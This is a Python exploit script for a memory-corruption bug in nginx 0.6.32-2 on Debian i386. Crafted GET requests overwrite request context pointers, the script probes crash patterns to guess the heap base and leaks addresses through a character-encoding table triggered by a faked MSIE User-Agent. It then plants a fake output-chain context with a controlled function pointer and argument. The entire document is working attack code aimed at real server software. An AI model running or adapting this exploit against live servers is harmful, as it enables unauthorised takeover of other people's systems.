#!/usr/bin/env python

# exploit for nginx 0.6.32-2 i386 (Debian) 
#
# Based on Aaron Conole's exploit
#
# http://www.exploit-db.com/exploits/14830/
#

import sys, socket

host, port, = sys.argv[1:3]
port = int(port)

char_encoding_ctx_index = 29
binbase=0x08048000
binend=0x080b4000+0x0a000 # address for version with debugging symbols
#binend=0x080b5000+0x0a000 # address for the official debian package (0.6.32-2)
request_offset=0xa768
handy_pointer_offset=0xa714


def tcp_request(send_data):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect( (host, port) )
	s.send(send_data)
	recv_data = s.recv(1024)
	s.close()
	return recv_data

def quoted_little_endian(addr):
	return ''.join( '%%%02x' % ( (addr>>(x*8)) & 0xff ) for x in range(4) )

def overwrite_ctx_pointers(ctx_pointers, headers=[]):
	pre_padding='X'*46
	post_padding='Y'*182
	request='\r\n'.join( [ 'GET /%3f/../' + pre_padding + ctx_pointers + post_padding + ' HTTP/1.0' ] +
	                     headers +
	                     [ '\r\n' ] )
	return tcp_request(request)

def create_ctx_pointer_array(i, pointer):
	return '\0\0\0\0'*i + quoted_little_endian(pointer) + '\0\0\0\0'*(35-i)

def exploit_ctx_pointers(ctx_addr, output_ctx):
	return ''.join( quoted_little_endian(x) for x in output_ctx ) + \
	       '\0\0\0\0'*(33-len(output_ctx)) + \
	       quoted_little_endian(ctx_addr) + \
	       '\0\0\0\0'*(2)
	
def report_ctx_pointer_crashes(pointer):
	crashes = []
	for i in range(36):
		ctx_pointers = create_ctx_pointer_array(i, pointer)
		if overwrite_ctx_pointers(ctx_pointers) == '':
			crashes.append(i)
	return tuple(crashes)

def guess_mmap_start_x(start, maximum, step):
	for i in range(start, maximum, step):
		crashes = report_ctx_pointer_crashes(i)
		if crashes != (27, 29, 30, 33, 34):
			return i
	return maximum

def guess_mmap_start(start, step, offset_range=(0,)):
	cur = 0xffffffff
	for off in offset_range:
		cur = guess_mmap_start_x(start+off, cur+off, step) - off
	return cur

def find_heap():
	heap_addr = guess_mmap_start(binend, 0x10000);
	return guess_mmap_start(max(heap_addr-0x40000,binend), 0x1000, (0,4,8,12,16) );

def do_pointer_checks():
	if report_ctx_pointer_crashes(0x00000000) != ():
		print 'ctx null pointers do not chrash nginx as expected'
		sys.exit(1)

	if report_ctx_pointer_crashes(0x00000001) != ( 27,  29,  30,  33,  34 ):
		print 'ctx protected memory pointers do not chrash nginx as expected'
		sys.exit(1)

	if report_ctx_pointer_crashes(binbase+4) != ( 29,  30,  33,  34 ):
		print 'ELF header pointer did not chrash nginx as expected'
		sys.exit(1)

	if report_ctx_pointer_crashes(binbase+8) != ( 30,  33,  34 ):
		print 'ELF header pointer did not chrash nginx as expected'
		sys.exit(1)

def get_lookup_table_info(heap_addr):

	# overwrite the character encoding filter with a pointer to a pointer
	# to a 256 byte region, the error page will be mapped using that table
	# by faking the MSIE User-Agent, we can get nginx to produce a '!' (0x21),
	# together with ' ' (0x20) and '"' (0x22) we can deduce the low 24 bit
	# of the context address

	pointer_to_just_before_r=heap_addr+handy_pointer_offset # should point to heap_addr+0xa750

	ctx_pointers = create_ctx_pointer_array(0,0)
	http_response = overwrite_ctx_pointers(ctx_pointers, headers=['User-Agent: MSIE 4.XX'])
	body_orig = http_response.partition('Connection: close\r\n\r\n')[2]

	ctx_pointers = create_ctx_pointer_array(char_encoding_ctx_index, pointer_to_just_before_r)
	http_response = overwrite_ctx_pointers(ctx_pointers, headers=['User-Agent: MSIE 4.XX'])
	body_trans = http_response.partition('Connection: close\r\n\r\n')[2]

	overwrite_ctx_pointers(create_ctx_pointer_array(33,0x1)) # erase char encoding 'table' by segv-ing

	table = [None]*256
	for o,t in zip(body_orig, body_trans):
		table[ord(o)] = ord(t)

	for i in range(16):
		for j in range(16):
			x = table[i*16+j]
			if x:
				print "%02x" % (x,),
			else:
				print "??",
		print
	return table

def find_ctx_array_addr(table, heap_addr):
	heap_addr_low24 = heap_addr & 0xffffff;
	ctx_array_addr_low24 = table[0x20] + table[0x21]*256 + table[0x22]*65536;
	if heap_addr_low24 > ctx_array_addr_low24:
		ctx_array_addr_low24 += 0x1000000;
	return (heap_addr & 0xff000000) + ctx_array_addr_low24

def find_pool_addr(table):
	return table[0x64] + (table[0x65]<<8) + (table[0x66]<<16) + (table[0x67]<<24)

do_pointer_checks()

heap_addr = find_heap()
print "guessed heap base address: %x" % (heap_addr,)
request_addr = heap_addr+0xa768
print "guessed (ngx_http_request_t*)r address: %x" % (request_addr,)
# raw_input()
table = get_lookup_table_info(heap_addr)
ctx_addr = find_ctx_array_addr(table, heap_addr)
print "r->ctx located at address: %x" % (ctx_addr,)
pool_addr = find_pool_addr(table)
print "r->pool located at address: %x" % (pool_addr,)

ngx_output_chain_ctx = [
	0, # buf
	0, # in
	0, # free
	0, # busy
	1, # sendfile
	0, # need_in_memory
	0, # need_in_temp
	pool_addr, #pool
	0, # allocated
	#bufs {
	1, # num
	32768, # size
	# }
	0x31415926, # tag
	0x42424242, # function pointer >:-D
	0x23232323, # 1st arg >:-D
]

file_not_found_msg_p="\x04\xf3\x0a\x08"
pointer_to_main_request=request_addr+448
pointer_to_last_header=request_addr+216

print
print "Now attach debugger and press enter :-)"
print " `gdb /usr/sbin/nginx $(pgrep -u www-data nginx)`"
raw_input()
ctx_pointers = exploit_ctx_pointers(ctx_addr, ngx_output_chain_ctx)
print overwrite_ctx_pointers(ctx_pointers)

